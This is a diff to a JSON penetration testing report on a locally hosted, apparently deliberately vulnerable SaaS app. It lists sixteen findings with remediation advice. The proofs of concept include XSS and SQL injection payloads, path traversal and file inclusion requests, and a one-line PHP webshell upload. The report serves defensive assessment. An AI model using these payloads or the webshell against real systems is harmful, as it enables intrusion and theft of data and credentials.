@@ -1,111 +1,492 @@
 {
-  "summary": {
-    "scan_id": "scan-987654321",
-    "target_url": "http://127.0.0.1/dvwa",
-    "status": "Completed",
-    "started_at": "2026-05-01T10:00:00Z",
-    "finished_at": "2026-05-01T10:05:30Z",
-    "duration_seconds": 330,
-    "total_findings": 3,
-    "severity_counts": {
-      "CRITICAL": 0, "HIGH": 2, "MEDIUM": 1, "LOW": 0, "INFO": 0
-    }
+  "report_metadata": {
+    "document_number": "T1-51.001",
+    "document_name": "NexusFlow SaaS Penetration Testing Report",
+    "date_generated": "2026-06-21T10:00:00Z",
+    "document_author": "Automated Scanner Engine",
+    "document_review": "Tech Lead"
   },
-  "findings": [
+  
+  "scope": {
+    "timeline": {
+      "start_date": "2026-06-21",
+      "duration_seconds": 145
+    },
+    "targets": [
+      {
+        "url": "http://127.0.0.1:5000"
+      }
+    ]
+  },
+
+  "executive_summary": {
+    "overall_threat_level": "Critical",
+    "aggregated_threat_distribution": {
+      "critical": 5,
+      "high": 8,
+      "medium": 3,
+      "low": 0
+    },
+    "findings_summary_table": [
+      { "id": "VULN-01", "finding_name": "Weak Password Policy", "risk": "Medium", "status": "Open" },
+      { "id": "VULN-02", "finding_name": "Missing Rate Limiting", "risk": "High", "status": "Open" },
+      { "id": "VULN-03", "finding_name": "Weak Session Configuration", "risk": "High", "status": "Open" },
+      { "id": "VULN-04", "finding_name": "Reflected XSS", "risk": "High", "status": "Open" },
+      { "id": "VULN-05", "finding_name": "Stored XSS", "risk": "High", "status": "Open" },
+      { "id": "VULN-06", "finding_name": "SQL Injection", "risk": "Critical", "status": "Open" },
+      { "id": "VULN-07", "finding_name": "Broken Access Control (Admin Routes)", "risk": "High", "status": "Open" },
+      { "id": "VULN-08", "finding_name": "IDOR — Profile / API Key Disclosure", "risk": "High", "status": "Open" },
+      { "id": "VULN-09", "finding_name": "IDOR — Private Document Access", "risk": "High", "status": "Open" },
+      { "id": "VULN-10", "finding_name": "Broken Access Control (Document Edit/Share)", "risk": "High", "status": "Open" },
+      { "id": "VULN-11", "finding_name": "Sensitive File Disclosure", "risk": "Critical", "status": "Open" },
+      { "id": "VULN-12", "finding_name": "Verbose Error Disclosure", "risk": "Medium", "status": "Open" },
+      { "id": "VULN-13", "finding_name": "Unsafe File Upload", "risk": "Critical", "status": "Open" },
+      { "id": "VULN-14", "finding_name": "Path Traversal", "risk": "Critical", "status": "Open" },
+      { "id": "VULN-15", "finding_name": "Local File Inclusion", "risk": "Critical", "status": "Open" },
+      { "id": "VULN-16", "finding_name": "IDOR — Message Access", "risk": "Medium", "status": "Open" }
+    ]
+  },
+
+  "methodology": {
+    "intro_text": "The application uses web technology to communicate with client applications. Many of the data compromises experienced by organizations stem from poor development practices, configuration weaknesses, and flawed implementation. This engagement is composed of five phases: Information Gathering, Vulnerability Identification, Penetration, Enumerating Further, and Reporting.",
+    "phases": [
+      "Information Gathering",
+      "Vulnerability Identification",
+      "Penetration",
+      "Reporting"
+    ]
+  },
+
+  "detailed_findings": [
     {
-      "id": "vuln-001",
-      "timestamp": "2026-05-01T10:01:15Z",
-      "vulnerability": "Reflected Cross-Site Scripting (XSS)",
-      "severity": "HIGH",
-      "confidence": "HIGH",
-      "cwe": "CWE-79",
-      "owasp": "A03:2021-Injection",
-      "url": "http://127.0.0.1/dvwa/vulnerabilities/xss_r/",
-      "description": "User input is reflected in the HTTP response without proper output encoding, allowing execution of malicious JavaScript.",
-      "request": {
-        "method": "GET",
-        "url": "http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>",
-        "headers": { "User-Agent": "Mozilla/5.0", "Cookie": "session=UserA_Token" },
-        "body": ""
-      },
-      "response": {
-        "status_code": 200,
-        "snippet": "<pre>Hello <script>alert(1)</script></pre>"
-      },
-      "proof": {
-        "parameter": "name",
-        "payload": "<script>alert(1)</script>"
-      },
-      "reproduction_steps": [
-        "1. Open the target URL.",
-        "2. Inject the payload '<script>alert(1)</script>' into the 'name' parameter.",
-        "3. Observe the executed JavaScript in the browser."
+      "id": "VULN-01",
+      "title": "Weak Password Policy",
+      "owasp_category": "A07:2021 - Identification and Authentication Failures",
+      "threat_level": "Medium",
+      "cvss_score": "5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)",
+      "affected_path": "POST /register",
+      "description": "The application calls generate_password_hash() directly with no server-side length, complexity, or common-password validation.",
+      "business_impact": "An attacker can register an account using a single-character password, completely bypassing enterprise security claims.",
+      "recommendations": [
+        "Enforce a minimum length of 12+ characters and complexity rules.",
+        "Check submitted passwords against a breached-password corpus."
       ],
-      "remediation": "Apply context-aware output encoding and sanitize user input."
+      "references": ["CWE-521", "OWASP Authentication Cheat Sheet"],
+      "proof_of_concept": {
+        "intro_text": "The following proof of concept shows how an account can be created with a 1-character password.",
+        "steps_to_reproduce": [
+          "1. Send a POST request to /register with password 'a'.",
+          "2. Observe the HTTP 302 redirect indicating successful account creation."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "POST /register HTTP/1.1\nusername=test123&password=a",
+          "response": "HTTP/1.1 302 Found\nLocation: /dashboard"
+        }
+      }
     },
     {
-      "id": "vuln-002",
-      "timestamp": "2026-05-01T10:03:40Z",
-      "vulnerability": "Sensitive File Disclosure (SFD)",
-      "severity": "MEDIUM",
-      "confidence": "CERTAIN",
-      "cwe": "CWE-200",
-      "owasp": "A01:2021-Broken Access Control",
-      "url": "http://127.0.0.1/.env",
-      "description": "An environment configuration file is publicly accessible, leaking sensitive system data.",
-      "request": {
-        "method": "GET",
-        "url": "http://127.0.0.1/.env",
-        "headers": { "User-Agent": "Mozilla/5.0" },
-        "body": ""
-      },
-      "response": {
-        "status_code": 200,
-        "snippet": "DB_PASSWORD=secret123\nAPI_KEY=abcde"
-      },
-      "proof": {
-        "file_path": "/.env",
-        "matched_pattern": "DB_PASSWORD"
-      },
-      "reproduction_steps": [
-        "1. Send a GET request to the /.env path.",
-        "2. Observe the server responds with a 200 OK and the file contents."
+      "id": "VULN-02",
+      "title": "Missing Rate Limiting / Brute-Force Protection",
+      "owasp_category": "A07:2021 - Identification and Authentication Failures",
+      "threat_level": "High",
+      "cvss_score": "7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
+      "affected_path": "POST /login",
+      "description": "The login endpoint does not implement IP-based throttling or account lockout after repeated failed attempts.",
+      "business_impact": "An attacker can script thousands of login attempts to brute-force passwords and takeover accounts.",
+      "recommendations": [
+        "Implement IP- and account-based rate limiting.",
+        "Add temporary account lockout and CAPTCHA on repeated failures."
       ],
-      "remediation": "Configure the web server to explicitly deny access to dotfiles and sensitive directories."
+      "references": ["CWE-307", "OWASP Rate Limiting Cheat Sheet"],
+      "proof_of_concept": {
+        "intro_text": "Demonstration of unrestricted login attempts.",
+        "steps_to_reproduce": [
+          "1. Send 100 sequential POST requests to /login with wrong passwords.",
+          "2. Observe no HTTP 429 Too Many Requests response is returned."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "POST /login HTTP/1.1\nusername=admin&password=wrong",
+          "response": "HTTP/1.1 200 OK\nIncorrect password"
+        }
+      }
     },
     {
-      "id": "vuln-003",
-      "timestamp": "2026-05-01T10:05:10Z",
-      "vulnerability": "Insecure Direct Object Reference (IDOR)",
-      "severity": "HIGH",
-      "confidence": "HIGH",
-      "cwe": "CWE-639",
-      "owasp": "A01:2021-Broken Access Control",
-      "url": "http://127.0.0.1/api/users/2/profile",
-      "description": "The endpoint does not enforce object-level authorization. A user can access another user's private data by modifying the ID parameter.",
-      "request": {
-        "method": "GET",
-        "url": "http://127.0.0.1/api/users/2/profile",
-        "headers": { 
-          "User-Agent": "Mozilla/5.0", 
-          "Cookie": "session=UserA_Token" 
-        },
-        "body": ""
-      },
-      "response": {
-        "status_code": 200,
-        "snippet": "{\"id\":2,\"name\":\"User B\",\"email\":\"userB@test.com\",\"role\":\"admin\"}"
-      },
-      "proof": {
-        "tested_parameter": "user_id",
-        "foreign_id_accessed": "2"
-      },
-      "reproduction_steps": [
-        "1. Authenticate as User A and obtain a session cookie.",
-        "2. Send a GET request to the target URL representing User B's profile.",
-        "3. Observe that the server returns User B's sensitive data instead of a 403 Forbidden error."
+      "id": "VULN-03",
+      "title": "Weak Session Configuration",
+      "owasp_category": "A05:2021 - Security Misconfiguration",
+      "threat_level": "High",
+      "cvss_score": "7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
+      "affected_path": "Application-wide (Cookie)",
+      "description": "The application sets SESSION_COOKIE_HTTPONLY = False and SESSION_COOKIE_SAMESITE = None.",
+      "business_impact": "Any successful XSS attack can steal the session cookie directly, and the application is vulnerable to CSRF.",
+      "recommendations": [
+        "Set SESSION_COOKIE_HTTPONLY = True.",
+        "Set SESSION_COOKIE_SAMESITE = 'Lax' or 'Strict'."
       ],
-      "remediation": "Implement strict object-level authorization checks validating that the requested ID belongs to the authenticated user's session."
+      "references": ["CWE-614", "CWE-1275"],
+      "proof_of_concept": {
+        "intro_text": "Cookie configuration analysis.",
+        "steps_to_reproduce": [
+          "1. Authenticate to the application.",
+          "2. Inspect the Set-Cookie response header."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "POST /login HTTP/1.1",
+          "response": "HTTP/1.1 302 Found\nSet-Cookie: session=ey...; Path=/"
+        }
+      }
+    },
+    {
+      "id": "VULN-04",
+      "title": "Reflected XSS",
+      "owasp_category": "A03:2021 - Injection",
+      "threat_level": "High",
+      "cvss_score": "6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)",
+      "affected_path": "GET /search?q=",
+      "description": "The search query parameter is reflected directly into the HTML response using the Jinja2 |safe filter, bypassing autoescaping.",
+      "business_impact": "An attacker can execute arbitrary JavaScript in the victim's browser to steal session tokens.",
+      "recommendations": [
+        "Remove the |safe filter and rely on Jinja2 autoescaping.",
+        "Add a Content-Security-Policy header."
+      ],
+      "references": ["CWE-79", "OWASP XSS Prevention Cheat Sheet"],
+      "proof_of_concept": {
+        "intro_text": "Executing arbitrary JS via the 'q' parameter.",
+        "steps_to_reproduce": [
+          "1. Navigate to /search?q=<script>alert(1)</script>.",
+          "2. Observe the unencoded payload in the response."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "GET /search?q=<script>alert(1)</script> HTTP/1.1",
+          "response": "HTTP/1.1 200 OK\n<script>alert(1)</script>"
+        }
+      }
+    },
+    {
+      "id": "VULN-05",
+      "title": "Stored XSS",
+      "owasp_category": "A03:2021 - Injection",
+      "threat_level": "High",
+      "cvss_score": "7.6 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)",
+      "affected_path": "POST /documents/<doc_id>/comment",
+      "description": "Comment content is stored verbatim in the database and rendered using the |safe filter on document views.",
+      "business_impact": "A low-privilege user can store a malicious script that fires for every subsequent visitor, including administrators.",
+      "recommendations": [
+        "Remove the |safe filter in templates.",
+        "Use an allow-list HTML sanitizer like Bleach if formatting is required."
+      ],
+      "references": ["CWE-79"],
+      "proof_of_concept": {
+        "intro_text": "Storing and triggering a JS payload in comments.",
+        "steps_to_reproduce": [
+          "1. Post a comment with payload <img src=x onerror=alert(1)>.",
+          "2. View the document and observe script execution."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "POST /documents/1/comment HTTP/1.1\ncontent=<img src=x onerror=alert(1)>",
+          "response": "HTTP/1.1 200 OK\n<img src=x onerror=alert(1)>"
+        }
+      }
+    },
+    {
+      "id": "VULN-06",
+      "title": "SQL Injection",
+      "owasp_category": "A03:2021 - Injection",
+      "threat_level": "Critical",
+      "cvss_score": "9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
+      "affected_path": "GET /people?department=",
+      "description": "The application builds a raw SQL string via f-string interpolation rather than using the parameterized SQLAlchemy ORM.",
+      "business_impact": "An attacker can extract any table from the database, including password hashes and API keys.",
+      "recommendations": [
+        "Use parameterized queries via SQLAlchemy ORM (e.g., User.query.filter_by).",
+        "Never build SQL via f-strings with user input."
+      ],
+      "references": ["CWE-89", "OWASP SQL Injection Prevention"],
+      "proof_of_concept": {
+        "intro_text": "Extracting data via UNION-based SQLi.",
+        "steps_to_reproduce": [
+          "1. Request /people?department=' UNION SELECT id,username... FROM users--.",
+          "2. Observe the extracted user data in the response."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "GET /people?department=' UNION SELECT 1,password... FROM users-- HTTP/1.1",
+          "response": "HTTP/1.1 200 OK\n[... API Keys Exposed ...]"
+        }
+      }
+    },
+    {
+      "id": "VULN-07",
+      "title": "Broken Access Control (Admin Routes)",
+      "owasp_category": "A01:2021 - Broken Access Control",
+      "threat_level": "High",
+      "cvss_score": "8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)",
+      "affected_path": "GET /admin/settings, POST /admin/users/export",
+      "description": "Administrative routes are missing the @admin_required decorator and only enforce general authentication.",
+      "business_impact": "A standard member can access workspace-wide settings and export CSVs of all users' API keys.",
+      "recommendations": [
+        "Apply the @admin_required decorator consistently to all administrative routes."
+      ],
+      "references": ["CWE-862"],
+      "proof_of_concept": {
+        "intro_text": "Accessing admin endpoints as a low-privilege user.",
+        "steps_to_reproduce": [
+          "1. Log in as a non-admin member.",
+          "2. Navigate to /admin/users/export."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "GET /admin/users/export HTTP/1.1\nCookie: session=member_session",
+          "response": "HTTP/1.1 200 OK\nid,email,role,api_key..."
+        }
+      }
+    },
+    {
+      "id": "VULN-08",
+      "title": "IDOR — Profile / API Key Disclosure",
+      "owasp_category": "A01:2021 - Broken Access Control",
+      "threat_level": "High",
+      "cvss_score": "8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)",
+      "affected_path": "GET /profile/<user_id>",
+      "description": "The application fetches the user profile using the URL parameter without validating if the current user is the owner or an admin.",
+      "business_impact": "Exposes sensitive fields like the target's API key, email, and role for any user.",
+      "recommendations": [
+        "Require an authorization check (current_user.id == target.id) before returning private fields."
+      ],
+      "references": ["CWE-639", "OWASP IDOR Cheat Sheet"],
+      "proof_of_concept": {
+        "intro_text": "Exfiltrating another user's API key via IDOR.",
+        "steps_to_reproduce": [
+          "1. Log in as user ID 2.",
+          "2. Request /profile/1 (Admin's profile)."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "GET /profile/1 HTTP/1.1\nCookie: session=user_2_session",
+          "response": "HTTP/1.1 200 OK\n\"api_key\": \"admin_secret_key\""
+        }
+      }
+    },
+    {
+      "id": "VULN-09",
+      "title": "IDOR — Private Document Access",
+      "owasp_category": "A01:2021 - Broken Access Control",
+      "threat_level": "High",
+      "cvss_score": "8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)",
+      "affected_path": "GET /documents/<doc_id>",
+      "description": "Documents flagged as private are fully viewable and downloadable by any authenticated user who guesses the document ID.",
+      "business_impact": "Unauthorized exposure of confidential company documents and intellectual property.",
+      "recommendations": [
+        "Enforce ownership checks (doc.owner_id == current_user.id or current_user.role == 'admin')."
+      ],
+      "references": ["CWE-639"],
+      "proof_of_concept": {
+        "intro_text": "Accessing a private document via predictable ID.",
+        "steps_to_reproduce": [
+          "1. Enumerate /documents/3 as a non-owner.",
+          "2. Observe that the private document content is returned."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "GET /documents/3 HTTP/1.1",
+          "response": "HTTP/1.1 200 OK\nSSO Integration Spec (Confidential)"
+        }
+      }
+    },
+    {
+      "id": "VULN-10",
+      "title": "Broken Access Control (Document Edit/Share)",
+      "owasp_category": "A01:2021 - Broken Access Control",
+      "threat_level": "High",
+      "cvss_score": "8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)",
+      "affected_path": "POST /documents/<doc_id>/edit",
+      "description": "Edit and share routes check for authentication but do not verify document ownership before allowing mutations.",
+      "business_impact": "Any authenticated user can rewrite or alter the visibility of a document they do not own.",
+      "recommendations": [
+        "Add ownership and permission verification before allowing database state changes."
+      ],
+      "references": ["CWE-862"],
+      "proof_of_concept": {
+        "intro_text": "Editing another user's document.",
+        "steps_to_reproduce": [
+          "1. Send a POST request to edit a document owned by the admin.",
+          "2. Observe the successful modification."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "POST /documents/3/edit HTTP/1.1\ntitle=Edited+By+Attacker",
+          "response": "HTTP/1.1 302 Found"
+        }
+      }
+    },
+    {
+      "id": "VULN-11",
+      "title": "Sensitive File Disclosure",
+      "owasp_category": "A05:2021 - Security Misconfiguration",
+      "threat_level": "Critical",
+      "cvss_score": "9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
+      "affected_path": "GET /backup/config",
+      "description": "The config_backup() route serves the config.bak file with no authentication decorator.",
+      "business_impact": "Exposes database credentials, Flask secret keys, JWT secrets, and AWS/Stripe keys in plaintext to unauthenticated attackers.",
+      "recommendations": [
+        "Remove backup files from any web-served path.",
+        "Store secrets securely in environment variables."
+      ],
+      "references": ["CWE-538"],
+      "proof_of_concept": {
+        "intro_text": "Fetching configuration files without authentication.",
+        "steps_to_reproduce": [
+          "1. Request /backup/config without a session cookie.",
+          "2. Observe the plaintext secrets in the response."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "GET /backup/config HTTP/1.1",
+          "response": "HTTP/1.1 200 OK\nsecret_key = '...'\nAWS_ACCESS_KEY = 'AKIA...'"
+        }
+      }
+    },
+    {
+      "id": "VULN-12",
+      "title": "Verbose Error Disclosure",
+      "owasp_category": "A05:2021 - Security Misconfiguration",
+      "threat_level": "Medium",
+      "cvss_score": "5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)",
+      "affected_path": "Application-wide",
+      "description": "Unhandled exceptions render verbose diagnostic HTML exposing absolute application paths, stack traces, and database URIs.",
+      "business_impact": "Provides attackers with internal environment details to chain into more complex attacks like LFI or SQLi.",
+      "recommendations": [
+        "Disable debug mode in production.",
+        "Return generic static error pages to the client."
+      ],
+      "references": ["CWE-209", "CWE-200"],
+      "proof_of_concept": {
+        "intro_text": "Triggering a verbose stack trace.",
+        "steps_to_reproduce": [
+          "1. Submit invalid data (e.g., recipient_id=not-a-number) to /messages/compose.",
+          "2. Observe the full Python traceback."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "POST /messages/compose HTTP/1.1\nrecipient_id=abc",
+          "response": "HTTP/1.1 500 Internal Server Error\nTraceback (most recent call last):"
+        }
+      }
+    },
+    {
+      "id": "VULN-13",
+      "title": "Unsafe File Upload",
+      "owasp_category": "A04:2021 - Insecure Design",
+      "threat_level": "Critical",
+      "cvss_score": "9.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)",
+      "affected_path": "POST /documents/upload",
+      "description": "The upload endpoint allowlists extensions including .php and .py without performing MIME-type validation, and stores files in the web root.",
+      "business_impact": "An attacker can upload and execute a webshell, gaining full remote command execution (RCE) on the server.",
+      "recommendations": [
+        "Restrict extension allowlist to genuine document formats.",
+        "Validate file content (magic bytes) server-side.",
+        "Store uploads outside the web root."
+      ],
+      "references": ["CWE-434"],
+      "proof_of_concept": {
+        "intro_text": "Uploading and executing a PHP webshell.",
+        "steps_to_reproduce": [
+          "1. Upload a file named shell.php.",
+          "2. Access /static/uploads/shell.php?cmd=id."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "POST /documents/upload HTTP/1.1\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\n\n<?php system($_GET['cmd']); ?>",
+          "response": "HTTP/1.1 302 Found"
+        }
+      }
+    },
+    {
+      "id": "VULN-14",
+      "title": "Path Traversal",
+      "owasp_category": "A01:2021 - Broken Access Control",
+      "threat_level": "Critical",
+      "cvss_score": "8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)",
+      "affected_path": "GET /download?file=",
+      "description": "The download route joins the user-supplied file parameter directly via os.path.join() with no containment check.",
+      "business_impact": "An attacker can manipulate the file query parameter to read arbitrary files on the server, including source code.",
+      "recommendations": [
+        "Resolve the requested path and verify it is a child of the UPLOAD_FOLDER before serving."
+      ],
+      "references": ["CWE-22"],
+      "proof_of_concept": {
+        "intro_text": "Reading arbitrary files outside the web root.",
+        "steps_to_reproduce": [
+          "1. Request /download?file=../../app.py.",
+          "2. Observe the application source code in the response."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "GET /download?file=../../app.py HTTP/1.1",
+          "response": "HTTP/1.1 200 OK\nfrom flask import Flask..."
+        }
+      }
+    },
+    {
+      "id": "VULN-15",
+      "title": "Local File Inclusion",
+      "owasp_category": "A01:2021 - Broken Access Control",
+      "threat_level": "Critical",
+      "cvss_score": "8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)",
+      "affected_path": "GET /preview?template=",
+      "description": "The preview route opens the user-supplied template path without validation, rendering the content in the response.",
+      "business_impact": "An attacker can read arbitrary files from the server filesystem and render them directly in the page.",
+      "recommendations": [
+        "Maintain an explicit allow-list of valid template names rather than reading directly from user input."
+      ],
+      "references": ["CWE-98", "CWE-22"],
+      "proof_of_concept": {
+        "intro_text": "Exploiting LFI via the template parameter.",
+        "steps_to_reproduce": [
+          "1. Request /preview?template=../config.bak.",
+          "2. Observe the leaked credentials returned inline."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "GET /preview?template=../config.bak HTTP/1.1",
+          "response": "HTTP/1.1 200 OK\n[... Database Credentials ...]"
+        }
+      }
+    },
+    {
+      "id": "VULN-16",
+      "title": "IDOR — Message Access",
+      "owasp_category": "A01:2021 - Broken Access Control",
+      "threat_level": "Medium",
+      "cvss_score": "6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)",
+      "affected_path": "GET /messages/<msg_id>",
+      "description": "The endpoint fetches the message without checking if current_user.id is the sender or recipient.",
+      "business_impact": "Any authenticated user can read private messages exchanged between two other users.",
+      "recommendations": [
+        "Verify current_user.id in (msg.sender_id, msg.recipient_id) before returning message content."
+      ],
+      "references": ["CWE-639"],
+      "proof_of_concept": {
+        "intro_text": "Reading another user's private messages.",
+        "steps_to_reproduce": [
+          "1. Request /messages/1 as an unrelated user.",
+          "2. Observe the contents of the private message."
+        ],
+        "evidence": {
+          "type": "http_snippet",
+          "request": "GET /messages/1 HTTP/1.1",
+          "response": "HTTP/1.1 200 OK\n[... Private Message Body ...]"
+        }
+      }
     }
-  ]
+  ],
+
+  "compliance_and_code_of_practice": {
+    "text": "ISO/IEC 27001:2013 serves as the source of guidance for the selection and implementation of controls... Open-Source Security Testing Methodology Manual (OSSTMM)... OWASP Testing Guide..."
+  }
 }
